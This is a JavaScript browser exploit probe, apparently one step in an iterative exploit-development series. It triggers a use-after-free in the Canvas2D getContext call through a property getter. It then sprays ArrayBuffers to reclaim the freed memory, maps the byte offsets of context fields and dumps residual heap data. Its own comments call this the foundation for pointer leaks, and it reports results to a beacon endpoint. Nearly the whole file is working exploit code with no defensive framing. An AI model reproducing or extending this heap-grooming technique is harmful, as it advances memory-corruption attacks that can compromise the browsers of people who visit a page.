// CRASH_CLASS: MODERATE
// PROBE p554: Cross-type reclaim + offset mapping
//
// p553 confirmed full bidirectional R/W via same-type (Canvas2D ↔ Canvas2D).
// Next: replace freed Canvas2D slot with ArrayBuffer backing store.
// If cross-type works, we get byte-level offset mapping between
// Canvas2D properties and raw memory — the foundation for pointer leaks.
//
// Plan:
//   A) Read freed memory BEFORE spray (residual data from freed context)
//   B) Cross-type: spray ArrayBuffers at ~768B, read getTransform
//   C) Offset mapping: setTransform known values, find aliased AB, dump bytes
//   D) Test multiple AB sizes if 768 doesn't match

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P554-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(msg.slice(0, 350));
    } catch (e) {}
  }

  function f64hex(f) {
    var buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = f;
    var u = new Uint8Array(buf);
    var s = '';
    for (var i = 7; i >= 0; i--) {
      var b = u[i].toString(16);
      s += (b.length < 2 ? '0' : '') + b;
    }
    return s;
  }

  emit('START', 'ua=' + navigator.userAgent.slice(0, 80));

  // ===================== STEP 1: Trigger UAF =====================

  var canvas = document.createElement('canvas');
  canvas.width = 1;
  canvas.height = 1;
  document.body.appendChild(canvas);
  retained.push(canvas);

  var inner = null;
  var getterFired = 0;
  var opts = {};

  Object.defineProperty(opts, 'desynchronized', {
    get: function () {
      getterFired++;
      if (getterFired === 1) {
        inner = canvas.getContext('2d');
      }
      return false;
    },
    enumerable: true
  });

  var outer = null;
  try {
    outer = canvas.getContext('2d', opts);
  } catch (e) {
    emit('ERR', 'getContext threw: ' + e);
    return;
  }

  retained.push(outer, inner);

  if (outer === inner || !inner) {
    emit('PATCHED', 'no UAF');
    return;
  }

  emit('TRIGGER', 'getter=' + getterFired + ' uaf=true');

  // ===================== STEP 2: Read freed memory BEFORE spray =====================

  try {
    var mPre = inner.getTransform();
    if (mPre) {
      emit('PRE-SPRAY', 'a=' + mPre.a + ' b=' + mPre.b + ' c=' + mPre.c +
        ' d=' + mPre.d + ' e=' + mPre.e + ' f=' + mPre.f);
      emit('PRE-HEX', 'a=' + f64hex(mPre.a) + ' b=' + f64hex(mPre.b) + ' d=' + f64hex(mPre.d));
    }
  } catch (e) {
    emit('PRE-ERR', String(e));
  }

  try {
    emit('PRE-PROPS', 'lw=' + inner.lineWidth + ' ga=' + inner.globalAlpha +
      ' ml=' + inner.miterLimit + ' sb=' + inner.shadowBlur +
      ' sox=' + inner.shadowOffsetX + ' soy=' + inner.shadowOffsetY);
  } catch (e) {
    emit('PRE-PROPS-ERR', String(e));
  }

  // ===================== STEP 3: Cross-type spray (ArrayBuffer) =====================

  function tryCrossType(size, label) {
    // Trigger a fresh UAF for this size test
    var c2 = document.createElement('canvas');
    c2.width = 1; c2.height = 1;
    document.body.appendChild(c2);
    retained.push(c2);

    var in2 = null;
    var g2 = 0;
    var o2 = {};
    Object.defineProperty(o2, 'desynchronized', {
      get: function () {
        g2++;
        if (g2 === 1) { in2 = c2.getContext('2d'); }
        return false;
      },
      enumerable: true
    });

    var out2 = null;
    try { out2 = c2.getContext('2d', o2); } catch (e) { return null; }
    retained.push(out2, in2);

    if (!in2 || out2 === in2) {
      emit(label + '-NOTRIG', 'UAF failed');
      return null;
    }

    // Spray ArrayBuffers at this size
    var COUNT = 30;
    var abs = [];
    var MARKER = 0xCAFE0000 + size;
    for (var i = 0; i < COUNT; i++) {
      var ab = new ArrayBuffer(size);
      var dv = new Float64Array(ab);
      for (var j = 0; j < dv.length; j++) {
        dv[j] = MARKER + i + j * 0.001;
      }
      abs.push(ab);
    }
    retained.push(abs);

    // Read getTransform on stale wrapper
    var m = null;
    try { m = in2.getTransform(); } catch (e) {
      emit(label + '-ERR', 'getTransform threw: ' + e);
      return null;
    }

    if (!m) {
      emit(label + '-NULL', 'getTransform null');
      return null;
    }

    var isIdentity = Math.abs(m.a - 1) < 0.001 && Math.abs(m.b) < 0.001 &&
      Math.abs(m.c) < 0.001 && Math.abs(m.d - 1) < 0.001 &&
      Math.abs(m.e) < 0.001 && Math.abs(m.f) < 0.001;

    var isZero = Math.abs(m.a) < 0.001 && Math.abs(m.b) < 0.001 &&
      Math.abs(m.c) < 0.001 && Math.abs(m.d) < 0.001 &&
      Math.abs(m.e) < 0.001 && Math.abs(m.f) < 0.001;

    var isMarker = m.a > 0xCAFE0000 - 1;

    emit(label, 'size=' + size + ' a=' + m.a + ' b=' + m.b + ' c=' + m.c +
      ' d=' + m.d + ' identity=' + isIdentity + ' zero=' + isZero + ' marker=' + isMarker);

    if (isMarker) {
      emit(label + '-HIT', 'ArrayBuffer reclaimed slot!');
    }

    return { stale: in2, abs: abs, m: m, hit: isMarker, zero: isZero, identity: isIdentity };
  }

  // Try primary size (768) and nearby size classes
  var sizes = [768, 784, 800, 752, 736, 704, 832, 640, 896, 512, 1024];
  var found = null;

  for (var si = 0; si < sizes.length; si++) {
    var result = tryCrossType(sizes[si], 'XTYPE-' + sizes[si]);
    if (!result) continue;

    if (result.hit || result.zero) {
      found = result;
      found.size = sizes[si];
      emit('XTYPE-FOUND', 'cross-type reclaim at size=' + sizes[si]);
      break;
    }
    if (!result.identity) {
      emit('XTYPE-WEIRD', 'size=' + sizes[si] + ' non-standard values — possible partial reclaim');
      found = result;
      found.size = sizes[si];
      break;
    }
  }

  if (!found) {
    emit('XTYPE-MISS', 'no cross-type reclaim at tested sizes');

    // Report all results for forensics
    emit('SIZES-TESTED', sizes.join(','));

    // Fall back: do same-type reclaim and try state stack experiments
    emit('FALLBACK', 'proceeding with same-type alias experiments');

    // Quick same-type reclaim for state stack tests
    var c3 = document.createElement('canvas');
    c3.width = 1; c3.height = 1;
    document.body.appendChild(c3);
    retained.push(c3);

    var in3 = null;
    var g3 = 0;
    var o3 = {};
    Object.defineProperty(o3, 'desynchronized', {
      get: function () { g3++; if (g3 === 1) { in3 = c3.getContext('2d'); } return false; },
      enumerable: true
    });
    var out3 = null;
    try { out3 = c3.getContext('2d', o3); } catch (e) {}
    retained.push(out3, in3);

    if (in3 && out3 && in3 !== out3) {
      // Spray for same-type reclaim
      for (var ri = 0; ri < 80; ri++) {
        var rc = document.createElement('canvas');
        rc.width = 1; rc.height = 1;
        var rctx = rc.getContext('2d');
        if (rctx) { rctx.setTransform(7.77, 0, 0, 7.77, 0, 0); retained.push(rc, rctx); }
      }

      var rm = null;
      try { rm = in3.getTransform(); } catch (e) {}
      if (rm && Math.abs(rm.a - 7.77) < 0.01) {
        emit('SAMETYPE-OK', 'same-type reclaim confirmed for state stack tests');

        // State stack growth experiment
        emit('STATESTACK', 'testing save() depth');
        var saveCount = 0;
        try {
          for (var si2 = 0; si2 < 200; si2++) {
            in3.save();
            saveCount++;
          }
          emit('SAVE-OK', 'saved ' + saveCount + ' times');

          // Restore all
          for (var ri2 = 0; ri2 < saveCount; ri2++) {
            in3.restore();
          }
          emit('RESTORE-OK', 'restored ' + saveCount + ' times');
        } catch (e) {
          emit('SAVE-ERR', 'crashed at save #' + saveCount + ': ' + e);
        }

        // Canvas identity test
        try {
          var canvasRef = in3.canvas;
          emit('CANVAS-REF', 'inner.canvas === original? ' + (canvasRef === c3) +
            ' tagName=' + (canvasRef ? canvasRef.tagName : 'null') +
            ' width=' + (canvasRef ? canvasRef.width : 'null'));
        } catch (e) {
          emit('CANVAS-REF-ERR', String(e));
        }
      }
    }

    emit('ALIVE', 'probe completed (no cross-type)');
    window.__p554 = retained;
    return;
  }

  // ===================== STEP 4: Offset mapping =====================

  emit('OFFSETMAP', 'mapping Canvas2D fields to byte offsets in AB');

  var stale = found.stale;
  var abs = found.abs;
  var hitSize = found.size;

  // Write unique doubles through Canvas2D
  var MA = 1.0000000000001;
  var MB = 2.0000000000002;
  var MC = 3.0000000000003;
  var MD = 4.0000000000004;
  var ME = 5.0000000000005;
  var MF = 6.0000000000006;

  try {
    stale.setTransform(MA, MB, MC, MD, ME, MF);
  } catch (e) {
    emit('MAP-WRITE-ERR', String(e));
  }

  // Set numeric properties too
  try {
    stale.lineWidth = 111.111;
    stale.globalAlpha = 0.222;
    stale.shadowBlur = 333.333;
    stale.shadowOffsetX = 444.444;
    stale.shadowOffsetY = 555.555;
    stale.miterLimit = 666.666;
    stale.lineDashOffset = 777.777;
  } catch (e) {
    emit('MAP-PROPSET-ERR', String(e));
  }

  // Scan all ABs for our written values
  var aliasIdx = -1;
  for (var ai = 0; ai < abs.length; ai++) {
    var dv = new Float64Array(abs[ai]);
    for (var di = 0; di < dv.length; di++) {
      if (Math.abs(dv[di] - MA) < 1e-10) {
        aliasIdx = ai;
        break;
      }
    }
    if (aliasIdx >= 0) break;
  }

  if (aliasIdx < 0) {
    emit('MAP-NOFIND', 'could not find aliased AB');
    emit('ALIVE', 'probe completed (cross-type but no alias found)');
    window.__p554 = retained;
    return;
  }

  emit('MAP-FOUND', 'aliased AB index=' + aliasIdx);

  // Dump all float64 values and byte offsets
  var aliasAB = abs[aliasIdx];
  var aliasF64 = new Float64Array(aliasAB);
  var aliasU8 = new Uint8Array(aliasAB);

  // Find offsets of our marker values
  var targets = [
    ['transform.a', MA], ['transform.b', MB], ['transform.c', MC],
    ['transform.d', MD], ['transform.e', ME], ['transform.f', MF],
    ['lineWidth', 111.111], ['globalAlpha', 0.222], ['shadowBlur', 333.333],
    ['shadowOffsetX', 444.444], ['shadowOffsetY', 555.555],
    ['miterLimit', 666.666], ['lineDashOffset', 777.777]
  ];

  var offsets = [];
  for (var ti = 0; ti < targets.length; ti++) {
    var name = targets[ti][0];
    var val = targets[ti][1];
    var off = -1;
    for (var fi = 0; fi < aliasF64.length; fi++) {
      if (Math.abs(aliasF64[fi] - val) < 1e-10) {
        off = fi * 8;
        break;
      }
    }
    offsets.push(name + '@' + off);
  }

  emit('OFFSETS', offsets.join(' '));

  // Dump non-zero bytes that are NOT our markers (residual / structural data)
  var nonZero = [];
  for (var bi = 0; bi < aliasU8.length; bi += 8) {
    var isOurMarker = false;
    var f64val = aliasF64[bi / 8];
    for (var ci = 0; ci < targets.length; ci++) {
      if (Math.abs(f64val - targets[ci][1]) < 1e-10) {
        isOurMarker = true;
        break;
      }
    }
    if (!isOurMarker && f64val !== 0) {
      nonZero.push('+' + bi + '=' + f64hex(f64val));
    }
  }

  if (nonZero.length > 0) {
    emit('RESIDUAL', nonZero.slice(0, 20).join(' '));
    if (nonZero.length > 20) {
      emit('RESIDUAL2', nonZero.slice(20, 40).join(' '));
    }
  } else {
    emit('RESIDUAL', 'none — all non-marker slots are zero');
  }

  // Full hex dump of first 128 bytes (compact)
  var hexDump = '';
  for (var hi = 0; hi < Math.min(128, aliasU8.length); hi++) {
    var hb = aliasU8[hi].toString(16);
    hexDump += (hb.length < 2 ? '0' : '') + hb;
    if (hi % 16 === 15) hexDump += '|';
  }
  emit('HEXDUMP', hexDump);

  // ===================== STEP 5: Read some data BEFORE our writes =====================
  // (Too late for this UAF — we already wrote. But report what we learned)

  emit('SUMMARY', 'cross-type at ' + hitSize + 'B, alias AB[' + aliasIdx + '], ' +
    offsets.length + ' fields mapped, ' + nonZero.length + ' residual slots');

  emit('ALIVE', 'probe completed');
  window.__p554 = retained;
})();
